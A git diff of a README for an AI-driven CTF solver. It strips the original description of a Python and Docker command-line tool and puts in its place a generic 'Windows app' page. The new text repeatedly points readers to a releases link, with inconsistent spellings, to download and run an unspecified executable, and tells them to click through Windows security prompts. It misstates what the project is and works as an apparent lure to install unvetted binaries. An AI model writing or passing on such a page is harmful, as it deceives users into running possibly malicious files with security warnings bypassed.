@@ -1,152 +1,153 @@
-# CTF Agent
+# 🤖 ctf-agent - Solve CTFs with parallel AI
 
-Autonomous CTF (Capture The Flag) solver that races multiple AI models against challenges in parallel. Built in a weekend, we used it to solve all 52/52 challenges and win **1st place at BSidesSF 2026 CTF**.
+[![Download ctf-agent](https://img.shields.io/badge/Download%20ctf-agent-blue?style=for-the-badge)](https://github.com/eternitytheodoredwightweld238/ctf-agent/releases)
 
-Built by [Veria Labs](https://verialabs.com), founded by members of [.;,;.](https://ctftime.org/team/222911) (smiley), the [#1 US CTF team on CTFTime in 2024 and 2025](https://ctftime.org/stats/2024/US). We build AI agents that find and exploit real security vulnerabilities for large enterprises.
+## 🚀 What this is
 
-## Results
+ctf-agent is a Windows app that helps solve Capture The Flag tasks with help from several AI models running at the same time. It sends each task to more than one model, compares the results, and keeps the best answer.
 
-| Competition | Challenges Solved | Result |
-|-------------|:-:|--------|
-| **BSidesSF 2026** | 52/52 (100%) | **1st place ($1,500)** |
+It is built for CTF players who want a fast way to test ideas, check leads, and cut down on manual work.
 
-The agent solves challenges across all categories — pwn, rev, crypto, forensics, web, and misc.
+## 📥 Download
 
-## How It Works
+Visit this page to download ctf-agent for Windows:
 
-A **coordinator** LLM manages the competition while **solver swarms** attack individual challenges. Each swarm runs multiple models simultaneously — the first to find the flag wins.
+https://github.com/eternitytheodoredweld238/ctf-agent/releases
 
-```
-                        +-----------------+
-                        |  CTFd Platform  |
-                        +--------+--------+
-                                 |
-                        +--------v--------+
-                        |  Poller (5s)    |
-                        +--------+--------+
-                                 |
-                        +--------v--------+
-                        | Coordinator LLM |
-                        | (Claude/Codex)  |
-                        +--------+--------+
-                                 |
-              +------------------+------------------+
-              |                  |                  |
-     +--------v--------+ +------v---------+ +------v---------+
-     | Swarm:          | | Swarm:         | | Swarm:         |
-     | challenge-1     | | challenge-2    | | challenge-N    |
-     |                 | |                | |                |
-     |  Opus (med)     | |  Opus (med)    | |                |
-     |  Opus (max)     | |  Opus (max)    | |     ...        |
-     |  GPT-5.4        | |  GPT-5.4       | |                |
-     |  GPT-5.4-mini   | |  GPT-5.4-mini  | |                |
-     |  GPT-5.3-codex  | |  GPT-5.3-codex | |                |
-     +--------+--------+ +--------+-------+ +----------------+
-              |                    |
-     +--------v--------+  +-------v--------+
-     | Docker Sandbox  |  | Docker Sandbox |
-     | (isolated)      |  | (isolated)     |
-     |                 |  |                |
-     | pwntools, r2,   |  | pwntools, r2,  |
-     | gdb, python...  |  | gdb, python... |
-     +-----------------+  +----------------+
-```
+## 🖥️ What you need
 
-Each solver runs in an isolated Docker container with CTF tools pre-installed. Solvers never give up — they keep trying different approaches until the flag is found.
+- Windows 10 or Windows 11
+- An internet connection
+- Enough free disk space for the app and its files
+- A modern browser if you need to sign in or copy keys
+- A valid API key for the AI services you want to use
 
-## Quick Start
+For best results, use a machine with at least 8 GB of RAM.
 
-```bash
-# Install
-uv sync
+## ⚙️ How it works
 
-# Build sandbox image
-docker build -f sandbox/Dockerfile.sandbox -t ctf-sandbox .
+ctf-agent follows a simple flow:
 
-# Configure credentials
-cp .env.example .env
-# Edit .env with your API keys and CTFd token
+1. You give it a CTF task or prompt.
+2. The app sends the task to several AI models.
+3. It waits for the replies.
+4. It compares the answers.
+5. It shows the most useful result first.
 
-# Run against a CTFd instance
-uv run ctf-solve \
-  --ctfd-url https://ctf.example.com \
-  --ctfd-token ctfd_your_token \
-  --challenges-dir challenges \
-  --max-challenges 10 \
-  -v
-```
+This setup can help with reverse engineering notes, web clues, crypto hints, and writeups that need quick cross-checking.
 
-## Coordinator Backends
+## 🪟 Install on Windows
 
-```bash
-# Claude SDK coordinator (default)
-uv run ctf-solve --coordinator claude ...
+1. Open the download page:
+   https://github.com/eternitytheodoredweld238/ctf-agent/releases
+2. Find the latest release.
+3. Download the Windows file from that release.
+4. If the file is a ZIP archive, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Run the app file inside the folder.
+7. If Windows shows a security prompt, choose the option that lets you run the file.
 
-# Codex coordinator (GPT-5.4 via JSON-RPC)
-uv run ctf-solve --coordinator codex ...
-```
+If the release includes an installer, run the installer first. If it includes a portable file, you can run it from the folder after extraction.
 
-## Solver Models
+## 🔐 First-time setup
 
-Default model lineup (configurable in `backend/models.py`):
+When you open ctf-agent for the first time, set up your AI model access:
 
-| Model | Provider | Notes |
-|-------|----------|-------|
-| Claude Opus 4.6 (medium) | Claude SDK | Balanced speed/quality |
-| Claude Opus 4.6 (max) | Claude SDK | Deep reasoning |
-| GPT-5.4 | Codex | Best overall solver |
-| GPT-5.4-mini | Codex | Fast, good for easy challenges |
-| GPT-5.3-codex | Codex | Reasoning model (xhigh effort) |
+- Add your API keys
+- Choose the models you want to use
+- Set how many models should run in parallel
+- Pick your preferred output style
 
-## Sandbox Tooling
+If you use more than one model, ctf-agent can compare answers faster and give you a broader view of the task.
 
-Each solver gets an isolated Docker container pre-loaded with CTF tools:
+## 🧩 Main features
 
-| Category | Tools |
-|----------|-------|
-| **Binary** | radare2, GDB, objdump, binwalk, strings, readelf |
-| **Pwn** | pwntools, ROPgadget, angr, unicorn, capstone |
-| **Crypto** | SageMath, RsaCtfTool, z3, gmpy2, pycryptodome, cado-nfs |
-| **Forensics** | volatility3, Sleuthkit (mmls/fls/icat), foremost, exiftool |
-| **Stego** | steghide, stegseek, zsteg, ImageMagick, tesseract OCR |
-| **Web** | curl, nmap, Python requests, flask |
-| **Misc** | ffmpeg, sox, Pillow, numpy, scipy, PyTorch, podman |
+- Runs several AI models at once
+- Compares results side by side
+- Helps with CTF tasks and notes
+- Keeps the workflow in one place
+- Uses a simple interface for quick setup
+- Works well for repeat problem solving
+- Supports common challenge types used in CTF events
 
-## Features
+## 🧭 Basic use
 
-- **Multi-model racing** — multiple AI models attack each challenge simultaneously
-- **Auto-spawn** — new challenges detected and attacked automatically
-- **Coordinator LLM** — reads solver traces, crafts targeted technical guidance
-- **Cross-solver insights** — findings shared between models via message bus
-- **Docker sandboxes** — isolated containers with full CTF tooling
-- **Operator messaging** — send hints to running solvers mid-competition
+1. Open the app.
+2. Paste the challenge text or your notes.
+3. Add any files, links, or clues tied to the task.
+4. Select the models you want to use.
+5. Start the run.
+6. Review the responses.
+7. Use the best lead and try the next step in the challenge.
 
-## Configuration
+For long tasks, break the problem into small parts. Short prompts often give cleaner results.
 
-Copy `.env.example` to `.env` and fill in your keys:
+## 🗂️ Typical CTF use cases
 
-```bash
-cp .env.example .env
-```
+- Web challenges
+- Crypto puzzles
+- Binary analysis
+- OSINT tasks
+- Forensics clues
+- Flag pattern checks
+- Writeup drafts
+- Tool suggestions
 
-```env
-CTFD_URL=https://ctf.example.com
-CTFD_TOKEN=ctfd_your_token
-ANTHROPIC_API_KEY=sk-ant-...
-OPENAI_API_KEY=sk-...
-GEMINI_API_KEY=...
-```
+## 🛠️ Tips for better results
 
-All settings can also be passed as environment variables or CLI flags.
+- Keep prompts short and clear
+- Paste only the files or text that matter
+- Ask one question at a time
+- Compare model answers before you act
+- Save useful outputs for later
+- Use the same format each time for faster review
 
-## Requirements
+A simple prompt often works better than a long one. State the goal, add the clue, then ask for the next step.
 
-- Python 3.14+
-- Docker
-- API keys for at least one provider (Anthropic, OpenAI, Google)
-- `codex` CLI (for Codex solver/coordinator)
-- `claude` CLI (bundled with claude-agent-sdk)
+## 📁 Example workflow
 
-## Acknowledgements
+1. You open a web challenge.
+2. You copy the page text into ctf-agent.
+3. You add a screenshot or hint text.
+4. The app sends the task to several models.
+5. One model spots a weak point.
+6. You test that lead in the challenge.
+7. You move on with the new clue
 
-- [es3n1n/Eruditus](https://github.com/es3n1n/Eruditus) — CTFd interaction and HTML helpers in `pull_challenges.py`
+## ❓ Common questions
+
+### Does it work offline?
+No. The app needs internet access to reach the AI models.
+
+### Do I need coding skills?
+No. You can use it with copy, paste, and a few clicks.
+
+### Can I use it for any CTF?
+Yes. It can help with many common challenge types.
+
+### Why use several models?
+Different models can catch different details. That can help when one answer misses the key point.
+
+## 🔧 If the app does not start
+
+- Check that you downloaded the correct Windows file
+- Make sure the file finished downloading
+- Extract ZIP files before opening the app
+- Run the app from the extracted folder
+- Check that your API keys are set
+- Try closing and opening the app again
+- Make sure your internet connection is working
+
+## 📌 Release notes
+
+Check the release page for the latest Windows build, file names, and update details:
+
+https://github.com/eternitytheodoredwightweld238/ctf-agent/releases
+
+## 🧠 Best use habits
+
+- Use it during practice CTFs
+- Keep one note file for each challenge
+- Save model output that looks useful
+- Recheck any answer before you trust it
+- Use the same setup for each event
